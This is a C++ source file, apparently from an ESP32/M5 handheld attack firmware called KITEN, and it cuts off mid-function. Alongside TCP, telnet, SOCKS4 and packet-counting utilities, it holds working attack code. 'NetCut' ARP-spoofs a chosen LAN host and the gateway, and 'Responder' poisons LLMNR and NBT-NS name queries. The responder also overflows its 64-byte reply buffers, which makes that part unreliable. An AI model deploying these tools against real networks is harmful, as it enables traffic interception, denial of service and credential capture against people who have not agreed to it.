

#include "wifi_menu.h"
#include "config.h"
#include "settings.h"
#include "keyboard.h"
#include "ui.h"
#include "menu.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiServer.h>
#include <esp_netif.h>
#include <esp_netif_net_stack.h>
#include <esp_wifi.h>
#include <esp_private/wifi.h>
#include <lwip/etharp.h>
#include <lwip/inet.h>
#include <lwip/ip4_addr.h>
#include <lwip/igmp.h>
#include <lwip/netif.h>
#include <lwip/pbuf.h>
#include <lwip/tcpip.h>
#include <WiFiUdp.h>

static bool waitEscOrSel(bool instantReturn = false)
{
    if (instantReturn) return false;
    for (;;) {
        M5.update();
        pollKeyboard();
        if (check(EscPress)) { waitAllKeysReleased(); return false; }
        if (check(SelPress)) { waitAllKeysReleased(); return true;  }
        delay(5);
    }
}

void listenTcpPort()
{
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Connect to WiFi first", true);
        return;
    }

    String portStr = keyboard("", 5, "TCP port to listen");
    if (portStr.length() == 0 || portStr == "\x1B") {
        displayError("No port number given");
        return;
    }
    int port = atoi(portStr.c_str());
    if (port <= 0 || port > 65535) {
        displayError("Invalid port number");
        return;
    }

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("LISTEN TCP", 4, 28);

    logClear();
    logPrint("Listening on:");
    logPrint(WiFi.localIP().toString() + ":" + portStr);
    logRender();

    WiFiServer server(port);
    server.begin();

    bool inputMode = false;
    for (;;) {
        M5.update();
        pollKeyboard();

        
        if (check(EscPress)) {
            waitAllKeysReleased();
            server.stop();
            displayInfo("Listener stopped", true);
            return;
        }

        
        if (check(SelPress)) {
            waitAllKeysReleased();
            String s = keyboard("", 64, "Send data (q=quit)");
            if (s == "\x1B" || s == "q") {
                server.stop();
                displayInfo("Listener stopped", true);
                return;
            }
            
            drawMainBorder(true);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setTextSize(FP);
            M5.Display.drawString("LISTEN TCP", 4, 28);
            logPrint("> " + s);
            logRender();
            
            
            
            
            continue;
        }

        
        WiFiClient client = server.accept();
        if (client) {
            logPrint("Client connected: " + client.remoteIP().toString());
            logRender();
            client.setNoDelay(true);

            
            while (client.connected()) {
                M5.update();
                pollKeyboard();
                if (check(EscPress)) {
                    waitAllKeysReleased();
                    client.stop();
                    server.stop();
                    displayInfo("Listener stopped", true);
                    return;
                }
                if (check(SelPress)) {
                    waitAllKeysReleased();
                    String s = keyboard("", 64, "Send data (q=quit)");
                    if (s == "\x1B" || s == "q") {
                        client.stop();
                        server.stop();
                        displayInfo("Listener stopped", true);
                        return;
                    }
                    drawMainBorder(true);
                    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
                    M5.Display.setTextSize(FP);
                    M5.Display.drawString("LISTEN TCP", 4, 28);
                    logPrint("> " + s);
                    logRender();
                    client.print(s);
                    continue;
                }
                if (client.available()) {
                    
                    String chunk;
                    int n = client.available();
                    if (n > 64) n = 64;
                    for (int i = 0; i < n; i++) {
                        char c = (char)client.read();
                        
                        if (c >= 0x20 && c < 0x7F) chunk += c;
                        else if (c == '\n') chunk += '\n';
                        else if (c == '\r') {  }
                        else chunk += '.';
                    }
                    logPrint(chunk);
                    logRender();
                }
                delay(5);
            }
            client.stop();
            logPrint("Client disconnected");
            logRender();
        }
        delay(10);
    }
}

void clientTCP()
{
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Connect to WiFi first", true);
        return;
    }

    String serverIP = keyboard("", 32, "Server IP");
    if (serverIP == "\x1B" || serverIP.length() == 0) return;
    String portStr = keyboard("", 5, "Server port");
    if (portStr == "\x1B" || portStr.length() == 0) return;
    int port = atoi(portStr.c_str());
    if (port <= 0 || port > 65535) {
        displayError("Invalid port number");
        return;
    }

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("TCP CLIENT", 4, 28);

    logClear();
    logPrint("Connecting to:");
    logPrint(serverIP + ":" + portStr);
    logRender();

    WiFiClient client;
    if (!client.connect(serverIP.c_str(), port, 10000)) {
        displayError("Connection failed", true);
        return;
    }
    logPrint("Connected!");
    logRender();
    client.setNoDelay(true);

    for (;;) {
        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            waitAllKeysReleased();
            client.stop();
            displayInfo("Client stopped", true);
            return;
        }
        if (check(SelPress)) {
            waitAllKeysReleased();
            String s = keyboard("", 64, "Send data (q=quit)");
            if (s == "\x1B" || s == "q") {
                client.stop();
                displayInfo("Client stopped", true);
                return;
            }
            drawMainBorder(true);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setTextSize(FP);
            M5.Display.drawString("TCP CLIENT", 4, 28);
            logPrint("> " + s);
            logRender();
            client.print(s);
            continue;
        }
        if (client.available()) {
            String chunk;
            int n = client.available();
            if (n > 64) n = 64;
            for (int i = 0; i < n; i++) {
                char c = (char)client.read();
                if (c >= 0x20 && c < 0x7F) chunk += c;
                else if (c == '\n') chunk += '\n';
                else if (c == '\r') {  }
                else chunk += '.';
            }
            logPrint(chunk);
            logRender();
        }
        if (!client.connected()) {
            logPrint("Connection closed");
            logRender();
            displayInfo("Connection closed", true);
            return;
        }
        delay(5);
    }
}

static const uint8_t SOCKS4_VERSION     = 4;
static const uint8_t SOCKS4_CMD_CONNECT = 1;
static const uint8_t SOCKS4_REP_GRANTED = 90;
static const uint8_t SOCKS4_REP_REJECTED= 91;

static bool socks4ReadRequest(WiFiClient &c, uint8_t &cd, uint16_t &port,
                              uint8_t ip[4], char *host, size_t hostSize)
{
    if (host && hostSize) host[0] = '\0';
    uint8_t vn;
    if (c.read(&vn, 1) != 1 || vn != SOCKS4_VERSION) return false;
    if (c.read(&cd, 1) != 1) return false;
    uint8_t portBuf[2];
    if (c.read(portBuf, 2) != 2) return false;
    port = (uint16_t)portBuf[0] << 8 | portBuf[1];
    if (c.read(ip, 4) != 4) return false;
    
    int ch;
    while ((ch = c.read()) != -1 && ch != 0) {  }
    if (ch != 0) return false;
    
    if (host && hostSize && ip[0] == 0 && ip[1] == 0 && ip[2] == 0 && ip[3] != 0) {
        size_t i = 0;
        while (i < hostSize - 1) {
            ch = c.read();
            if (ch == -1) return false;
            if (ch == 0) break;
            host[i++] = (char)ch;
        }
        host[i] = '\0';
    }
    return true;
}

static void socks4SendReply(WiFiClient &c, uint8_t cd, uint16_t port, const uint8_t *ip)
{
    uint8_t reply[8] = {
        0, cd,
        (uint8_t)(port >> 8), (uint8_t)(port & 0xff),
        ip[0], ip[1], ip[2], ip[3]
    };
    c.write(reply, 8);
}

void socks4Proxy(uint16_t port)
{
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Connect to WiFi first", true);
        return;
    }

    WiFiServer server(port);
    server.begin();
    server.setNoDelay(true);

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("SOCKS4 PROXY", 4, 28);

    logClear();
    logPrint("Port: " + String(port));
    logPrint("IP: " + WiFi.localIP().toString());
    logPrint("Waiting for clients...");
    logRender();

    char host[256];
    uint8_t ip[4];
    uint8_t cd;
    uint16_t dstPort;
    int connCount = 0;

    for (;;) {
        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            waitAllKeysReleased();
            server.stop();
            displayInfo("SOCKS4 stopped", true);
            return;
        }

        WiFiClient client = server.accept();
        if (!client) { delay(10); continue; }

        connCount++;
        client.setNoDelay(true);
        logPrint("#" + String(connCount) + " " + client.remoteIP().toString());
        logRender();

        if (!socks4ReadRequest(client, cd, dstPort, ip, host, sizeof(host))) {
            socks4SendReply(client, SOCKS4_REP_REJECTED, 0, ip);
            client.stop();
            logPrint("  bad request");
            logRender();
            continue;
        }
        if (cd != SOCKS4_CMD_CONNECT) {
            socks4SendReply(client, SOCKS4_REP_REJECTED, 0, ip);
            client.stop();
            logPrint("  unsupported cmd");
            logRender();
            continue;
        }

        String destStr = host[0] != '\0'
            ? (String(host) + ":" + String(dstPort))
            : (IPAddress(ip[0], ip[1], ip[2], ip[3]).toString() + ":" + String(dstPort));
        logPrint("  -> " + destStr);
        logRender();

        WiFiClient target;
        bool ok = false;
        if (host[0] != '\0') ok = target.connect(host, dstPort, 10000);
        else                 ok = target.connect(IPAddress(ip[0], ip[1], ip[2], ip[3]),
                                                dstPort, 10000);
        if (!ok) {
            socks4SendReply(client, SOCKS4_REP_REJECTED, 0, ip);
            client.stop();
            logPrint("  FAILED");
            logRender();
            continue;
        }

        logPrint("  OK - relaying");
        logRender();
        target.setNoDelay(true);
        socks4SendReply(client, SOCKS4_REP_GRANTED, dstPort, ip);

        
        uint8_t buf[512];
        while (client.connected() && target.connected()) {
            M5.update();
            pollKeyboard();
            if (check(EscPress)) {
                waitAllKeysReleased();
                target.stop(); client.stop();
                server.stop();
                displayInfo("SOCKS4 stopped", true);
                return;
            }
            int n = 0;
            if (client.available()) {
                n = client.read(buf, sizeof(buf));
                if (n > 0) target.write(buf, (size_t)n);
            }
            if (target.available()) {
                n = target.read(buf, sizeof(buf));
                if (n > 0) client.write(buf, (size_t)n);
            }
            if (n <= 0) delay(5);
        }
        target.stop();
        client.stop();
        logPrint("  closed");
        logRender();
    }
}

void telnet_setup()
{
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Connect to WiFi first", true);
        return;
    }

    String host = keyboard("", 32, "Telnet host");
    if (host == "\x1B" || host.length() == 0) return;
    String portStr = keyboard("23", 5, "Telnet port");
    if (portStr == "\x1B" || portStr.length() == 0) return;
    int port = atoi(portStr.c_str());
    if (port <= 0) port = 23;

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("TELNET", 4, 28);

    logClear();
    logPrint("Connecting to:");
    logPrint(host + ":" + String(port));
    logRender();

    WiFiClient client;
    if (!client.connect(host.c_str(), port, 10000)) {
        displayError("Connection failed", true);
        return;
    }
    logPrint("Connected!");
    logRender();
    client.setNoDelay(true);

    uint8_t buf[256];
    for (;;) {
        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            waitAllKeysReleased();
            client.stop();
            displayInfo("Telnet stopped", true);
            return;
        }
        if (check(SelPress)) {
            waitAllKeysReleased();
            String s = keyboard("", 64, "Send (q=quit)");
            if (s == "\x1B" || s == "q") {
                client.stop();
                displayInfo("Telnet stopped", true);
                return;
            }
            drawMainBorder(true);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setTextSize(FP);
            M5.Display.drawString("TELNET", 4, 28);
            logPrint("> " + s);
            logRender();
            client.print(s);
            client.print("\r\n");
            continue;
        }
        if (client.available()) {
            int n = client.available();
            if (n > (int)sizeof(buf)) n = sizeof(buf);
            int rd = client.read(buf, n);
            String chunk;
            for (int i = 0; i < rd; i++) {
                uint8_t c = buf[i];
                
                if (c == 0xFF) {
                    if (i + 2 < rd) {
                        
                        uint8_t reply[3] = { 0xFF, 0xFC, buf[i + 2] };  
                        client.write(reply, 3);
                        i += 2;
                        continue;
                    }
                }
                if (c >= 0x20 && c < 0x7F) chunk += (char)c;
                else if (c == '\n') chunk += '\n';
                else if (c == '\r') {  }
                else chunk += '.';
            }
            logPrint(chunk);
            logRender();
        }
        if (!client.connected()) {
            logPrint("Disconnected");
            logRender();
            displayInfo("Disconnected", true);
            return;
        }
        delay(5);
    }
}

void ssh_setup(const String &host)
{
    (void)host;
    displayInfo(
        "SSH requires libssh2\n"
        "library. Use Telnet\n"
        "for plain-text shells.\n"
        "SSH coming in a future\n"
        "KITEN build.",
        true);
}

static uint32_t s_sniffBeacons   = 0;
static uint32_t s_sniffProbes    = 0;
static uint32_t s_sniffData      = 0;
static uint32_t s_sniffDeauth    = 0;
static uint32_t s_sniffOther     = 0;
static uint8_t  s_sniffChannel   = 1;
static uint32_t s_sniffStartTime = 0;

static void IRAM_ATTR sniffPromiscCb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!buf) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    uint8_t frameType  = frame[0] & 0x0C;  
    uint8_t frameSub   = frame[0] & 0xF0;
    (void)frameSub;
    if (frameType == 0x00) {
        
        uint8_t sub = (frame[0] >> 4) & 0x0F;
        if (sub == 0x08)      s_sniffBeacons++;
        else if (sub == 0x04 || sub == 0x05) s_sniffProbes++;
        else                  s_sniffOther++;
    } else if (frameType == 0x08) {
        s_sniffData++;
    } else if (frameType == 0x00 && ((frame[0] >> 4) & 0x0F) == 0x0C) {
        s_sniffDeauth++;
    } else {
        s_sniffOther++;
    }
}

void sniffer_setup()
{
    
    
    if (WiFi.getMode() != WIFI_MODE_APSTA) {
        WiFi.mode(WIFI_MODE_APSTA);
        delay(100);
        WiFi.softAP("KITENAttack", "", 6, 1, 4, false);
        delay(100);
    }

    
    bool hopMode = true;
    std::vector<Option> opts = {
        {"Channel Hop",  [&]() { hopMode = true;  }},
        {"Fixed Ch 6",   [&]() { hopMode = false; }},
        {"Back",         [](){}},
    };
    int sel = loopOptions(opts, MENU_TYPE_SUBMENU, "Sniffer Mode");
    if (sel == -1 || sel == (int)opts.size() - 1) {
        
        WiFi.softAPdisconnect(true);
        delay(100);
        WiFi.mode(WIFI_OFF);
        return;
    }

    s_sniffBeacons = s_sniffProbes = s_sniffData = s_sniffDeauth = s_sniffOther = 0;
    s_sniffChannel = hopMode ? 1 : 6;
    s_sniffStartTime = millis();

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(s_sniffChannel, WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(sniffPromiscCb);
    esp_wifi_set_promiscuous(true);

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("SNIFFER", 4, 28);
    M5.Display.drawString("Back: stop", 4, SCREEN_HEIGHT - LH * FP - 1);

    uint32_t lastHop = millis();
    uint32_t lastDraw = 0;
    for (;;) {
        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            waitAllKeysReleased();
            break;
        }

        
        if (hopMode && millis() - lastHop > 500) {
            s_sniffChannel = (s_sniffChannel % 11) + 1;
            esp_wifi_set_channel(s_sniffChannel, WIFI_SECOND_CHAN_NONE);
            lastHop = millis();
        }

        
        if (millis() - lastDraw > 250) {
            uint32_t elapsed = (millis() - s_sniffStartTime) / 1000;
            M5.Display.fillRect(0, 40, SCREEN_WIDTH, SCREEN_HEIGHT - 60,
                                kitenConfig.bgColor);
            M5.Display.setCursor(4, 40);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setTextSize(FP);
            M5.Display.println("Ch: " + String(s_sniffChannel) +
                               "  Time: " + String(elapsed) + "s");
            M5.Display.println("Beacons:  " + String(s_sniffBeacons));
            M5.Display.println("Probes:   " + String(s_sniffProbes));
            M5.Display.println("Data:     " + String(s_sniffData));
            M5.Display.println("Deauth:   " + String(s_sniffDeauth));
            M5.Display.println("Other:    " + String(s_sniffOther));
            uint32_t total = s_sniffBeacons + s_sniffProbes + s_sniffData
                             + s_sniffDeauth + s_sniffOther;
            M5.Display.println("Total:    " + String(total));
            lastDraw = millis();
        }
        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.mode(WIFI_OFF);
    delay(100);

    displayInfo("Sniffer stopped", true);
}

void scanHosts()
{
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Connect to WiFi first", true);
        return;
    }

    IPAddress local   = WiFi.localIP();
    IPAddress gateway = WiFi.gatewayIP();
    IPAddress subnet  = WiFi.subnetMask();

    
    uint32_t localRaw = (uint32_t)local;
    uint32_t baseHost = localRaw & 0xFFFFFF00;  

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("SCAN HOSTS", 4, 28);

    logClear();
    logPrint("Local: " + local.toString());
    logPrint("GW: " + gateway.toString());
    logPrint("Mask: " + subnet.toString());
    logPrint("Scanning /24...");
    logRender();

    std::vector<String> foundHosts;
    int scanned = 0;
    uint32_t lastDraw = 0;

    for (int i = 1; i < 255; i++) {
        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            waitAllKeysReleased();
            displayInfo("Scan cancelled", true);
            return;
        }

        IPAddress target(IPAddress(baseHost | (uint32_t)i));
        
        ip4_addr_t targetIp;
        targetIp.addr = (uint32_t)target;
        etharp_query(NULL, &targetIp, NULL);
        
        delay(5);

        
        const ip4_addr_t *cachedIp = nullptr;
        struct eth_addr *cachedEth = nullptr;
        if (etharp_find_addr(NULL, &targetIp, &cachedEth, &cachedIp) >= 0) {
            char macStr[18];
            snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                     cachedEth->addr[0], cachedEth->addr[1], cachedEth->addr[2],
                     cachedEth->addr[3], cachedEth->addr[4], cachedEth->addr[5]);
            String entry = target.toString() + " " + String(macStr);
            foundHosts.push_back(entry);
            logPrint(entry);
            logRender();
        }

        scanned++;
        if (millis() - lastDraw > 250) {
            
            logRender();
            lastDraw = millis();
        }
    }

    logPrint("Done. " + String(foundHosts.size()) + " hosts up.");
    logRender();
    displayInfo("Found " + String(foundHosts.size()) + " hosts", true);
}

static struct netif *_netcutGetStaNetif()
{
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta) return nullptr;
    return (struct netif *)esp_netif_get_netif_impl(sta);
}

static void _netcutSendArp(struct netif *iface,
                           const uint8_t *ethDst,
                           const uint8_t *srcMac,
                           const uint8_t *srcIp,
                           const uint8_t *dstMac,
                           const uint8_t *dstIp,
                           uint16_t opcode,
                           int repeat = 1)
{
    if (!iface) return;
    uint8_t pkt[42];
    
    memcpy(pkt + 0,  ethDst,  6);    
    memcpy(pkt + 6,  srcMac,  6);    
    pkt[12] = 0x08; pkt[13] = 0x06;  
    
    pkt[14] = 0x00; pkt[15] = 0x01;  
    pkt[16] = 0x08; pkt[17] = 0x00;  
    pkt[18] = 6;                      
    pkt[19] = 4;                      
    pkt[20] = 0x00; pkt[21] = (uint8_t)opcode; 
    memcpy(pkt + 22, srcMac, 6);     
    memcpy(pkt + 28, srcIp,  4);     
    memcpy(pkt + 32, dstMac, 6);     
    memcpy(pkt + 38, dstIp,  4);     

    for (int i = 0; i < repeat; i++) {
        esp_wifi_internal_tx(WIFI_IF_STA, pkt, sizeof(pkt));
        if (repeat > 1) delay(1);
    }
}

static bool _netcutLookupMac(struct netif *iface, IPAddress ip, uint8_t outMac[6], int probeMs = 200)
{
    if (!iface) return false;
    ip4_addr_t ipaddr;
    ipaddr.addr = (uint32_t)ip;

    
    LOCK_TCPIP_CORE();
    for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ipRet = nullptr;
        struct eth_addr *ethRet = nullptr;
        struct netif *nif = nullptr;
        if (etharp_get_entry(i, &ipRet, &nif, &ethRet)) {
            if (ipRet && ipRet->addr == ipaddr.addr && ethRet) {
                memcpy(outMac, ethRet->addr, 6);
                UNLOCK_TCPIP_CORE();
                return true;
            }
        }
    }
    
    etharp_request(iface, &ipaddr);
    UNLOCK_TCPIP_CORE();

    unsigned long start = millis();
    while ((long)(millis() - start) < probeMs) {
        LOCK_TCPIP_CORE();
        for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
            ip4_addr_t *ipRet = nullptr;
            struct eth_addr *ethRet = nullptr;
            struct netif *nif = nullptr;
            if (etharp_get_entry(i, &ipRet, &nif, &ethRet)) {
                if (ipRet && ipRet->addr == ipaddr.addr && ethRet) {
                    memcpy(outMac, ethRet->addr, 6);
                    UNLOCK_TCPIP_CORE();
                    return true;
                }
            }
        }
        UNLOCK_TCPIP_CORE();
        delay(5);
    }
    return false;
}

void netcutMenu()
{
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Connect to WiFi first", true);
        return;
    }

    
    struct netif *iface = _netcutGetStaNetif();
    if (!iface) {
        displayError("STA netif not found", true);
        return;
    }

    IPAddress local   = WiFi.localIP();
    IPAddress gateway = WiFi.gatewayIP();
    IPAddress netmask = WiFi.subnetMask();
    uint32_t network  = (uint32_t)gateway & (uint32_t)netmask;

    
    
    uint8_t ourMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, ourMac);

    
    
    wifi_ps_type_t savedPs;
    esp_wifi_get_ps(&savedPs);
    esp_wifi_set_ps(WIFI_PS_NONE);

    
    LOCK_TCPIP_CORE();
    etharp_cleanup_netif(iface);
    UNLOCK_TCPIP_CORE();

    
    uint8_t gwMac[6];
    bool gwOk = false;
    if (_netcutLookupMac(iface, gateway, gwMac, 800)) {
        gwOk = true;
    } else {
        
        wifi_ap_record_t ap_info;
        if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
            memcpy(gwMac, ap_info.bssid, 6);
            gwOk = true;
        }
    }
    if (!gwOk) {
        esp_wifi_set_ps(savedPs);
        displayError("Gateway MAC unknown\n(ping it first?)", true);
        return;
    }

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("NETCUT SCAN", 4, 28);

    logClear();
    logPrint("Scanning LAN...");
    logPrint("GW: " + gateway.toString());
    logRender();

    
    std::vector<String> ipList;
    std::vector<String> macList;
    int scannedCount = 0;
    int foundCount = 0;
    unsigned long lastDraw = millis();
    for (uint32_t i = 1; i < 254; i++) {
        IPAddress target(IPAddress(network | i));
        if ((uint32_t)target == (uint32_t)local) continue;
        if ((uint32_t)target == (uint32_t)gateway) continue;
        uint8_t mac[6];
        if (_netcutLookupMac(iface, target, mac, 30)) {
            char macStr[18];
            snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                     mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
            ipList.push_back(target.toString());
            macList.push_back(String(macStr));
            foundCount++;
        }
        scannedCount++;

        M5.update();
        pollKeyboard();
        if (millis() - lastDraw > 250) {
            logClear();
            logPrint("Scanning LAN...");
            logPrint("GW: " + gateway.toString());
            logPrint("Scanned: " + String(scannedCount) + "/253");
            logPrint("Found: " + String(foundCount));
            logRender();
            lastDraw = millis();
        }
        if (check(EscPress)) {
            waitAllKeysReleased();
            esp_wifi_set_ps(savedPs);
            return;
        }
    }

    if (ipList.empty()) {
        esp_wifi_set_ps(savedPs);
        displayError("No hosts found on LAN", true);
        return;
    }

    
    std::vector<Option> opts;
    for (size_t i = 0; i < ipList.size(); i++) {
        String ipStr = ipList[i];
        String macStr = macList[i];
        opts.push_back({ipStr + " " + macStr, [ipStr, macStr, gateway, gwMac, ourMac, iface]() {
            
            IPAddress targetIP;
            targetIP.fromString(ipStr);
            uint8_t targetMac[6];
            sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &targetMac[0], &targetMac[1], &targetMac[2],
                   &targetMac[3], &targetMac[4], &targetMac[5]);

            uint8_t targetIpBytes[4], gwIpBytes[4];
            targetIpBytes[0] = targetIP[0]; targetIpBytes[1] = targetIP[1];
            targetIpBytes[2] = targetIP[2]; targetIpBytes[3] = targetIP[3];
            gwIpBytes[0] = gateway[0]; gwIpBytes[1] = gateway[1];
            gwIpBytes[2] = gateway[2]; gwIpBytes[3] = gateway[3];

            drawMainBorder(true);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setTextSize(FP);
            M5.Display.setTextDatum(top_left);
            M5.Display.drawString("NETCUT", 4, 28);

            logClear();
            logPrint("Target: " + ipStr);
            logPrint("MAC: " + macStr);
            logPrint("GW: " + gateway.toString());
            logPrint("Spoofing... Back: stop");
            logRender();

            
            _netcutSendArp(iface, targetMac, ourMac, gwIpBytes,    targetMac, targetIpBytes, 2, 5);
            _netcutSendArp(iface, gwMac,    ourMac, targetIpBytes, gwMac,    gwIpBytes,     2, 5);

            uint32_t lastSpoof = 0;
            for (;;) {
                M5.update();
                pollKeyboard();
                if (check(EscPress)) {
                    waitAllKeysReleased();
                    
                    _netcutSendArp(iface, targetMac, gwMac,    gwIpBytes,    targetMac, targetIpBytes, 2, 3);
                    _netcutSendArp(iface, gwMac,    targetMac, targetIpBytes, gwMac,    gwIpBytes,     2, 3);
                    delay(50);
                    _netcutSendArp(iface, targetMac, gwMac,    gwIpBytes,    targetMac, targetIpBytes, 2, 3);
                    _netcutSendArp(iface, gwMac,    targetMac, targetIpBytes, gwMac,    gwIpBytes,     2, 3);
                    displayInfo("NetCut stopped", true);
                    return;
                }
                if (millis() - lastSpoof > 150) {
                    
                    _netcutSendArp(iface, targetMac, ourMac, gwIpBytes, targetMac, targetIpBytes, 2, 3);
                    
                    _netcutSendArp(iface, gwMac, ourMac, targetIpBytes, gwMac, gwIpBytes, 2, 3);
                    lastSpoof = millis();
                }
                delay(5);
            }
        }});
    }
    opts.push_back({"Back", [&savedPs]() { esp_wifi_set_ps(savedPs); }});
    loopOptions(opts, MENU_TYPE_REGULAR, "Pick Target");
    
    esp_wifi_set_ps(savedPs);
}

static void responderUdpTask(void *arg)
{
    (void)arg;
    WiFiUDP udpLlmnr, udpNbt;
    udpLlmnr.begin(5355);
    udpNbt.begin(137);

    uint8_t replyLlmnr[64];
    uint8_t replyNbt[64];

    IPAddress ourIp = WiFi.localIP();
    uint8_t ourIpBytes[4] = { ourIp[0], ourIp[1], ourIp[2], ourIp[3] };

    for (;;) {
        
        int n = udpLlmnr.parsePacket();
        if (n > 0) {
            uint8_t buf[512];
            int rd = udpLlmnr.read(buf, sizeof(buf));
            if (rd >= 12 && (buf[2] & 0x80) == 0) {
                
                memcpy(replyLlmnr, buf, rd);
                replyLlmnr[2] |= 0x80;  
                replyLlmnr[7] = 1;       
                
                
                
                
                replyLlmnr[rd + 0] = 0xC0; replyLlmnr[rd + 1] = 0x0C;  
                replyLlmnr[rd + 2] = 0x00; replyLlmnr[rd + 3] = 0x01;  
                replyLlmnr[rd + 4] = 0x00; replyLlmnr[rd + 5] = 0x01;  
                replyLlmnr[rd + 6] = 0x00; replyLlmnr[rd + 7] = 0x00;  
                replyLlmnr[rd + 8] = 0x00; replyLlmnr[rd + 9] = 0x1E;  
                replyLlmnr[rd + 10] = 0x00; replyLlmnr[rd + 11] = 0x04; 
                memcpy(replyLlmnr + rd + 12, ourIpBytes, 4);
                udpLlmnr.beginPacket(udpLlmnr.remoteIP(), udpLlmnr.remotePort());
                udpLlmnr.write(replyLlmnr, rd + 16);
                udpLlmnr.endPacket();
            }
        }
        
        n = udpNbt.parsePacket();
        if (n > 0) {
            uint8_t buf[512];
            int rd = udpNbt.read(buf, sizeof(buf));
            if (rd >= 12 && (buf[2] & 0x80) == 0) {
                memcpy(replyNbt, buf, rd);
                replyNbt[2] |= 0x80;
                replyNbt[7] = 1;
                replyNbt[rd + 0] = 0xC0; replyNbt[rd + 1] = 0x0C;
                replyNbt[rd + 2] = 0x00; replyNbt[rd + 3] = 0x20;  
                replyNbt[rd + 4] = 0x00; replyNbt[rd + 5] = 0x01;
                replyNbt[rd + 6] = 0x00; replyNbt[rd + 7] = 0x00;
                replyNbt[rd + 8] = 0x00; replyNbt[rd + 9] = 0x1E;
                replyNbt[rd + 10] = 0x00; replyNbt[rd + 11] = 0x06;
                replyNbt[rd + 12] = 0x00; replyNbt[rd + 13] = 0x00; 
                memcpy(replyNbt + rd + 14, ourIpBytes, 4);
                udpNbt.beginPacket(udpNbt.remoteIP(), udpNbt.remotePort());
                udpNbt.write(replyNbt, rd + 18);
                udpNbt.endPacket();
            }
        }
        delay(5);
    }
}

void responder()
{
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Connect to WiFi first", true);
        return;
    }

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("RESPONDER", 4, 28);

    logClear();
    logPrint("IP: " + WiFi.localIP().toString());
    logPrint("Listening on UDP 5355 (LLMNR)");
    logPrint("Listening on UDP 137  (NBT-NS)");
    logPrint("Answering all queries");
    logPrint("Back: stop");
    logRender();

    
    TaskHandle_t taskHandle = nullptr;
    xTaskCreatePinnedToCore(responderUdpTask, "responder", 4096, NULL, 1, &taskHandle, 0);

    for (;;) {
        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            waitAllKeysReleased();
            break;
        }
        delay(50);
    }

    if (taskHandle) vTaskDelete(taskHandle);
    displayInfo("Responder stopped", true);
}

void wifi_recover_menu()
{
    auto ssids = kitenConfig.listWifiSSIDs();
    if (ssids.empty()) {
        displayInfo("No saved WiFi credentials", true);
        return;
    }

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
